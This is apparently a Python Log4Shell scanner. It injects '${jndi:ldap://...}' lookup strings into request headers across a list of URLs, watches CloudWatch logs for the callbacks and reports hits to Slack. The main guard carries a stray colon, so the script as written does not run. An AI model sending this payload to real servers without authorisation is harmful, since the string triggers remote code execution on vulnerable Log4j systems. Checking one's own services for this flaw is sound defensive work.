import boto3
from datetime import datetime, timedelta
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError
import time
import requests
import argparse
import string
import random
import os

# Required positional argument
parser = argparse.ArgumentParser(description='Optional app description')
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Specify URLs list",
                    action='store',
                    default='urls.txt')
parser.add_argument("-a", "--appid",
                    dest="appid",
                    help="Specify appid",
                    action='store')
parser.add_argument("-e", "--env",
                    dest="env",
                    help="Specify environment",
                    action='store')
parser.add_argument("-H", "--header",
                    dest="header",
                    help="Specify headers file",
                    action='store',
                    default='headers.txt'
                    )

DOMAIN = os.getenv('DOMAIN')
random_id = str(''.join(random.choices(string.digits, k = 5)))
SLACK_API_TOKEN = os.getenv('SLACK_API_TOKEN')
SLACK_CHANNEL = os.getenv('SLACK_CHANNEL')
slack_client = WebClient(token=SLACK_API_TOKEN)
args = parser.parse_args()
client = boto3.client('logs')
query = "fields @timestamp, @message | sort @timestamp desc | filter @message =~ /{0}/".format(args.appid)  
log_group = os.getenv('LOG_GROUP')
timeout = time.time() + 60*60   # 60 minutes from now
payload = "jndi:ldap://{0}-{1}-{2}.{3}/a".format(args.appid, args.env, random_id, DOMAIN)
headers = []
urls = []

# Create an array of headers from file
with open(args.header, "r") as f:
    for i in f.readlines():
        i = i.strip()
        headers.append({i: '${' + payload + '}' })

# Create an array of URLs from file
with open(args.url, "r") as f:
    for i in f.readlines():
        i = i.strip()
        urls.append(i)

def sendRequest():
    # Send requests to vulnerable endpoints
    for header in headers:
        for url in urls:
            requests.get(url, headers=header)
            print('Sending request to {0} with payload {1}'.format(url, header))
            time.sleep(1)
    return 1

def queryCloudwatch():
    print('Checking Cloudwatch logs...')
    while True:
        start_query_response = client.start_query(
        logGroupName=log_group,
        startTime=int((datetime.today() - timedelta(hours=1)).timestamp()),
        endTime=int(datetime.now().timestamp()),
        queryString=query,
        )

        query_id = start_query_response['queryId']
        response = client.get_query_results(
            queryId=query_id
        )
        time.sleep(1)
        if response['status'] != 'Running' and response['results'] != []:
            try:
                for record in response['results']:
                    slack_client.chat_postMessage(
                    channel=SLACK_CHANNEL,
                    text=str(record)
                    )
                print("Complete. Sent to slack channel")
                return response
            except SlackApiError as e:
                # You will get a SlackApiError if "ok" is False
                assert e.response["error"]
                print(e)
                return e
        elif time.time() > timeout:
            print("Timeout reached. Seems your site is not vulnerable")
            return 1

if __name__ == "__main__:":
    sendRequest()
    #queryCloudwatch()
